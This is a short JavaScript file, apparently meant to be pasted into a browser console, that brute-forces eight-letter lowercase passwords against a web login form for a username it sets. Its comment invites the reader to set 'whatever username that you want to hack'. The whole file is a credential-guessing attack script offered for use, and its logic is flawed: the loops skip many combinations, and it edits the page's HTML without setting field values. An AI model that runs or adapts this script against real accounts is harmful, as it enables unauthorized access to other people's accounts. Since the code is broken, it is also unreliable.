var chars = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"];
var pos = [0, 0, 0, 0, 0, 0, 0, 0];
var pass = "";
var login = "merrijac000"; //set to be whatever username that you want to hack, in this case it is my own.
//for loops
for (var a = 0;/*you can change this to start the password: a=0, b=1, c=2, etc.*/ a < 26; a++) {
    for (var b = 1; b < 26; b++) {
        for (var c = 2; c < 26; c++) {
            for (var d = 3; d < 26; d++) {
                for (var e = 4; e < 26; e++) {
                    for (var f = 5; f < 26; f++) {
                        for (var g = 6; g < 26; g++) {
                            for (var h = 7; h < 26; h++) {
                                pos[0] = a;
                                pos[1] = b;
                                pos[2] = c;
                                pos[3] = d;
                                pos[4] = e;
                                pos[5] = f;
                                pos[6] = g;
                                pos[7] = h;
                                //passwords to skip will be added soon. Currently not very efficient.
                                pass = "";
                                pass += (chars[pos[0]] + chars[pos[1]] + chars[pos[2]] + chars[pos[3]] + chars[pos[4]] + chars[pos[5]] + chars[pos[6]] + chars[pos[7]]);
                                document.getElementById("password").outerHTML += ("value=" + pass);
                                console.log(pass);
                                if (cbs("bLogin")) {
                                    tryLogin();
                                }
                                if (cbs('msgBtn1')) {
                                    closeMessage(false);
                                    document.getElementById('login').focus();
                                    document.getElementById('login').select();
                                    cancelEvent();
                                }
                                document.getElementById("login").outerHTML += ("value=" + login)
                            }
                        }
                    }
                }
            }
        }
    }
}
